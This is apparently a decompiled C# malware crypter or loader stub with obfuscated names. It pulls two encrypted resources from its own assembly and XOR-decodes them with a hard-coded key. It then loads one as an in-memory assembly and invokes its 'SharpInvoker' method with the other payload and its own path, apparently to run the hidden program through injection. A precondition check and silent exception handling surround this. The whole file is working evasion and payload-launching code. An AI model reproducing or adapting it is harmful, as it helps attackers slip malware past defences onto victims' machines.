using System;
using System.Reflection;
using System.Resources;
using System.Text;

namespace ns9;

internal sealed class Class59
{
	private static void Main()
	{
		try
		{
			if (Class54.smethod_5())
			{
				ResourceManager resourceManager = new ResourceManager("myres", Assembly.GetExecutingAssembly());
				string s = (string)resourceManager.GetObject("fileread");
				string s2 = (string)resourceManager.GetObject("peread");
				resourceManager.ReleaseAllResources();
				byte[] byte_ = smethod_1(Encoding.Default.GetBytes(s), "myshittykey");
				byte[] byte_2 = smethod_1(Encoding.Default.GetBytes(s2), "myshittykey");
				smethod_0(byte_2, byte_);
			}
		}
		catch
		{
		}
	}

	public static void smethod_0(byte[] byte_0, byte[] byte_1)
	{
		Assembly assembly = Assembly.Load(byte_0);
		Type[] types = assembly.GetTypes();
		Type[] array = types;
		foreach (Type type in array)
		{
			if (!type.ToString().Contains("Sharpvtwo"))
			{
				continue;
			}
			MethodInfo[] methods = type.GetMethods();
			MethodInfo[] array2 = methods;
			foreach (MethodInfo methodInfo in array2)
			{
				if (methodInfo.ToString()!.Contains("SharpInvoker"))
				{
					methodInfo.Invoke(null, new object[3]
					{
						true,
						Assembly.GetExecutingAssembly().Location,
						byte_1
					});
				}
			}
		}
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		int num = 350;
		byte[] bytes = Encoding.ASCII.GetBytes(string_0);
		for (int i = 0; i < byte_0.Length; i++)
		{
			byte_0[i] ^= (byte)((bytes[i % bytes.Length] >> i + num + bytes.Length) & 0xFF);
		}
		return byte_0;
	}
}
